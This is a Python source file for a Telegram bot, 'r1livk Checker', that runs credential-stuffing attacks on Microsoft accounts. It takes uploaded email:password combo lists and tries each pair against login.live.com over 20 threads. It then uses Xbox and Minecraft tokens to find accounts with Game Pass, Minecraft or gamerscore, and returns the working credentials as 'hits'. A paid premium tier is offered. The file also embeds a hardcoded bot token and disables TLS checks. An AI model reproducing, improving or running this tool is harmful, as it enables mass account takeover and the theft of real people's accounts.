# -*- coding: utf-8 -*-
"""
r1livk Checker ⚡ - Telegram Bot (Fixed Thread-Safe High Speed)
"""

import os
import re
import time
import threading
from concurrent.futures import ThreadPoolExecutor
import requests
import urllib3
from urllib.parse import urlparse, parse_qs
from requests.adapters import HTTPAdapter
import telebot
from telebot import types

urllib3.disable_warnings()

TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
bot = telebot.TeleBot(TOKEN)

REQUEST_TIMEOUT = 25
MAX_THREADS = 20

active_scans = {}

def extract_ppft(text):
    patterns = [
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT":"([^"]+)"',
        r'value=\\"([^\\"]+)\\"'
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            token = match.group(1)
            token = token.replace('\\/', '/').replace('\\"', '"').replace('\\x26', '&')
            return token
    return None

def extract_url_post(text):
    patterns = [
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'id="fmHF"\s+action="([^"]+)"',
        r'action="([^"]+)"[^>]*id="fmHF"'
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            url = match.group(1)
            url = url.replace('\\/', '/')
            return url
    return None

def check_single_account(combo):
    parts = combo.split(':')
    if len(parts) < 2:
        return "bad", None

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()
    adapter = HTTPAdapter(pool_connections=5, pool_maxsize=5)

    session = requests.Session()
    session.verify = False
    session.mount('https://', adapter)
    session.mount('http://', adapter)
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.9",
    })

    try:
        sftag_url = (
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch"
            "&response_type=token"
            "&locale=en"
        )
        resp = session.get(sftag_url, timeout=REQUEST_TIMEOUT)
        sftag = extract_ppft(resp.text)
        url_post = extract_url_post(resp.text)

        if not sftag or not url_post:
            session.close()
            return "bad", None

        login_data = {
            'login': email,
            'loginfmt': email,
            'passwd': password,
            'PPFT': sftag,
            'type': '11',
            'NewUser': '1',
            'LoginOptions': '3',
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': sftag_url,
            'Origin': 'https://login.live.com',
        }
        login_req = session.post(url_post, data=login_data, headers=headers, allow_redirects=True, timeout=REQUEST_TIMEOUT)
        login_text = login_req.text.lower()

        ms_token = None
        if 'access_token' in login_req.url:
            ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
        elif 'access_token' in login_text:
            token_match = re.search(r'access_token=([^&\s\"\']+)', login_text)
            if token_match:
                ms_token = token_match.group(1)
        
        if not ms_token:
            if any(x in login_text for x in ["recover", "identity/confirm", "locked", "security challenge", "two-step", "additional security"]):
                session.close()
                return "twofa", None
            session.close()
            return "bad", None

        xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
        xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, timeout=REQUEST_TIMEOUT)
        
        if xb_req.status_code != 200:
            session.close()
            return "bad", None

        xb_token = xb_req.json()['Token']
        uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']

        gamertag = "N/A"
        gamerscore = "0"
        gscore_int = 0
        try:
            xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
            xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, timeout=REQUEST_TIMEOUT)
            if xsts_xb_req.status_code == 200:
                xsts_xb_token = xsts_xb_req.json()['Token']
                prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
                                       headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, timeout=REQUEST_TIMEOUT)
                if prof_req.status_code == 200:
                    settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                    for s in settings:
                        if s['id'] == 'Gamertag': gamertag = s['value']
                        if s['id'] == 'Gamerscore': 
                            gamerscore = s['value']
                            gscore_int = int(gamerscore) if gamerscore.isdigit() else 0
        except:
            pass

        mc_ent_text = ""
        try:
            xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
            xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, timeout=REQUEST_TIMEOUT)
            if xsts_mc_req.status_code == 200:
                xsts_mc_token = xsts_mc_req.json()['Token']
                mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
                                       json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"}, timeout=REQUEST_TIMEOUT)
                if mc_auth.status_code == 200:
                    mc_token = mc_auth.json().get('access_token')
                    if mc_token:
                        ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
                        if ent_req.status_code == 200:
                            mc_ent_text = ent_req.text
        except:
            pass

        has_gp = 'product_game_pass' in mc_ent_text
        has_mc = 'product_minecraft' in mc_ent_text

        session.close()

        hit_info = (
            f"📧 **Email:** `{email}`\n"
            f"🔑 **Password:** `{password}`\n"
            f"🎮 **Gamertag:** {gamertag}\n"
            f"🏆 **Gamerscore:** {gamerscore}\n"
            f"⛏️ **Minecraft:** {'Yes' if has_mc else 'No'}\n"
            f"🎮 **Game Pass:** {'Yes' if has_gp else 'No'}\n"
            f"-----------------------------------"
        )
        
        if has_gp or has_mc or gscore_int > 0:
            return "hit", {"content": hit_info, "has_mc": has_mc, "has_gp": has_gp, "has_xbox": gscore_int > 0}
        else:
            return "bad", None

    except Exception:
        if session:
            session.close()
        return "error", None

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_start = types.InlineKeyboardButton("⚡ Start Checker", callback_data="start_checker")
    btn_premium = types.InlineKeyboardButton("💎 Buy Premium (15$)", callback_data="buy_premium")
    btn_account = types.InlineKeyboardButton("👤 My Account", callback_data="my_account")
    markup.add(btn_start, btn_premium, btn_account)

    text = (
        "⚡ **r1livk Checker** ⚡\n\n"
        "Welcome to the ultimate account checking bot.\n"
        "Your Status: 👤 Free (0/10000 lines today)\n\n"
        "Features:\n"
        "• Xbox Game Pass Status\n"
        "• Xbox Live Premium\n"
        "• Gamertag & Profile\n"
        "• Game entitlements\n"
        "• Email Access & 2FA detection\n\n"
        "Click the button below to start checking your combo files!"
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    if call.data == "start_checker":
        markup = types.InlineKeyboardMarkup()
        btn_cancel = types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_checker")
        markup.add(btn_cancel)

        text = (
            "🎮 **r1livk Checker - Xbox + Minecraft + GamePass**\n\n"
            "Full Xbox/Minecraft account capture:\n"
            "• Minecraft Accounts\n"
            "• Xbox Game Pass Status\n"
            "• Xbox Live Premium\n"
            "• Gamertag & Profile\n"
            "• Game entitlements\n"
            "• Email Access\n"
            "• 2FA detection\n\n"
            "Send your combo file (txt format) (Forward or Direct file)\n"
            "Format: `email:password`\n\n"
            "Max: 10000 lines / day"
        )
        bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
    
    elif call.data == "cancel_checker" or call.data == "back_to_menu":
        active_scans[chat_id] = False
        send_welcome(call.message)

    elif call.data == "stop_scan":
        active_scans[chat_id] = False
        bot.answer_callback_query(call.id, "⏹️ تم إيقاف الفحص بنجاح.")

    elif call.data == "buy_premium":
        bot.answer_callback_query(call.id, "لشراء النسخة المدفوعة يرجى التواصل مع المطور @llljjv", show_alert=True)

    elif call.data == "my_account":
        bot.answer_callback_query(call.id, "حسابك الحالي: مجاني (Free)\nالحد اليومي: 10000 سطر", show_alert=True)

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    chat_id = message.chat.id
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        local_path = f"temp_combo_{chat_id}.txt"
        with open(local_path, 'wb') as f:
            f.write(downloaded_file)

        bot.reply_to(message, "📥 تم استلام الملف بنجاح، جاري بدء الفحص السريع...")
        active_scans[chat_id] = True
        threading.Thread(target=process_checker, args=(chat_id, local_path)).start()

    except Exception as e:
        bot.reply_to(message, f"حدث خطأ أثناء تحميل الملف: {e}")

def process_checker(chat_id, filepath):
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip() and ':' in line]

    total = len(lines)
    checked = 0
    hits = 0
    bad = 0
    twofa = 0
    errors = 0
    mc_hits = 0
    gp_hits = 0
    xbox_hits = 0

    timestamp_str = time.strftime("%Y%m%d_%H%M%S")
    output_filename = f"r1livk_Checker_hits_{timestamp_str}.txt"
    start_time = time.time()

    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_stop = types.InlineKeyboardButton("🛑 Stop Scan", callback_data="stop_scan")
    btn_back = types.InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
    markup.add(btn_stop, btn_back)

    initial_status_text = (
        f"🔥 **LIVE SCAN STATS**\n\n"
        f"📊 Total: {total}\n"
        f"✅ Checked: 0\n"
        f"❌ Bad: 0\n"
        f"🎯 Hits: 0\n"
        f"📱 2FA: 0\n"
        f"⚠️ Errors: 0\n\n"
        f"Progress: 0.0%\n"
        f"⚡ CPM: 0\n"
        f"⏱️ Elapsed: 00:00:00"
    )
    status_msg = bot.send_message(chat_id, initial_status_text, parse_mode="Markdown", reply_markup=markup)

    lock = threading.Lock()

    def worker(combo):
        nonlocal checked, hits, bad, twofa, errors, mc_hits, gp_hits, xbox_hits
        if not active_scans.get(chat_id, True):
            return

        status, data = check_single_account(combo)

        with lock:
            checked += 1
            if status == "hit" and data:
                hits += 1
                if data["has_mc"]: mc_hits += 1
                if data["has_gp"]: gp_hits += 1
                if data["has_xbox"]: xbox_hits += 1

                with open(output_filename, 'a', encoding='utf-8') as out_f:
                    out_f.write(data["content"] + "\n\n")
            elif status == "bad":
                bad += 1
            elif status == "twofa":
                twofa += 1
            else:
                errors += 1

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(worker, line) for line in lines]
        
        while any(not f.done() for f in futures):
            if not active_scans.get(chat_id, True):
                executor.shutdown(wait=False, cancel_futures=True)
                break
            
            with lock:
                curr_checked = checked
                curr_bad = bad
                curr_hits = hits
                curr_twofa = twofa
                curr_errors = errors
                curr_mc = mc_hits
                curr_gp = gp_hits
                curr_xb = xbox_hits

            elapsed = int(time.time() - start_time)
            if elapsed > 0:
                mins, secs = divmod(elapsed, 60)
                hrs, mins = divmod(mins, 60)
                cpm = int((curr_checked / elapsed) * 60) if elapsed > 0 else 0
                pct = (curr_checked / total) * 100 if total > 0 else 0

                live_text = (
                    f"🔥 **LIVE SCAN STATS (Auto-refresh)**\n\n"
                    f"📊 Total: {total}\n"
                    f"✅ Checked: {curr_checked}\n"
                    f"❌ Bad: {curr_bad}\n"
                    f"🎯 Hits: {curr_hits}\n"
                    f"📱 2FA: {curr_twofa}\n"
                    f"⚠️ Errors: {curr_errors}\n\n"
                    f"Progress: {pct:.1f}%\n"
                    f"⚡ CPM: {cpm}\n"
                    f"⏱️ Elapsed: {hrs:02d}:{mins:02d}:{secs:02d}\n\n"
                    f"🎮 Gaming Hits:\n"
                    f"• MC Hits: {curr_mc}\n"
                    f"• GamePass Hits: {curr_gp}\n"
                    f"• Xbox Live: {curr_xb}"
                )
                try:
                    bot.edit_message_text(live_text, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown", reply_markup=markup)
                except:
                    pass
            time.sleep(1.5)

    elapsed_total = int(time.time() - start_time)
    t_mins, t_secs = divmod(elapsed_total, 60)

    completion_text = (
        f"✅ **XBOX + MINECRAFT + GAMEPASS SCAN COMPLETED!**\n\n"
        f"📊 Total: {total}\n"
        f"🎯 Hits: {hits}\n"
        f"  • Minecraft: {mc_hits}\n"
        f"  • GamePass: {gp_hits}\n"
        f"  • Xbox Live: {xbox_hits}\n"
        f"📱 2FA: {twofa}\n"
        f"❌ Bad: {bad}\n\n"
        f"⏱️ Time: {t_mins:02d}:{t_secs:02d}"
    )
    bot.send_message(chat_id, completion_text, parse_mode="Markdown")

    if hits > 0 and os.path.exists(output_filename):
        with open(output_filename, 'rb') as res_f:
            bot.send_document(chat_id, res_f, caption=f"📁 جميع الهيتس مجتمعة - r1livk Checker")

    if os.path.exists(filepath):
        os.remove(filepath)
    active_scans[chat_id] = False

if __name__ == "__main__":
    print("r1livk Checker High-Speed Bot is running...")
    bot.infinity_polling()
